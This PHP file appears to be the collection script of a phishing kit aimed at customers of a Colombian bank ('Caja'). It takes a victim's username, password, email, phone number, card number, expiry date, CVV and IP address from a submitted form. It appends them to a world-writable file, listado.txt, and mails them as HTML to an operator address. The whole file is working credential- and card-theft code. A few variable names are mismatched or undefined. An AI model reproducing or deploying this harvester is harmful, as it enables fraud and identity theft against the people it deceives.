<?php
require('../config.php'); 
date_default_timezone_set('America/Bogota');
$celular = $_POST['cel'];
$usuario = $_POST['usr1'];
$pass = $_POST['pas1'];
$correo = $_POST['eml'];

$tarjeta = $_POST['tar'];
$fecha = $_POST['fec'];
$cvv = $_POST['cvv'];
$tipo = $_POST['tip'];

$ipcliente= $_SERVER['REMOTE_ADDR'];

$datos = 'Usuario: ['.$tipo.'] '.$usuario.' | Clave: '.$pass.' | Correo: '.$correo.' | Celular: '.$celular.' | Tarjeta: '.$tarjeta.' | Fecha: '.$fecha.' | CVV: '.$cvv.' | IP: '.$ipcliente;

$file = '../listado.txt';
$salto = "";
$cabecera = "---------------- Paso 3 (".date("Y-m-d H:i:s").")";

$fp = fopen($file, 'a+');
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $cabecera.PHP_EOL);
fwrite($fp, utf8_decode($datos).PHP_EOL);
fclose($fp);
chmod($file, 0777);
echo $file;

$hoy1 = date("Y/m/d");  
$hoy2 = date("Y-m-d H:i:s");  

$to = $destino;
$subject = "Datos Caja Paso 3".$usuario." - ".$hoy1;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 $message = "
<html>
<head>
<title>Datos</title>
</head>
<body>
<b>Usuario: </b>".$usuario." <b>Contraseña: </b>".$contrasena." <b>Correo: </b>".$correo." <b>Celular: </b>".$celular." <b>Tranquila: </b>".$tarjeta." <b>Fecha Exp: </b>".$fecha." <b>CVV: </b>".$cvv." <b>Dispositivo: </b>".$dispositivo." <b>Dirección IP: </b>".$ipcliente." <b>Fecha: </b>".$hoy2."
</body>
</html>";
 
mail($to, $subject, $message, $headers);
exit();
?>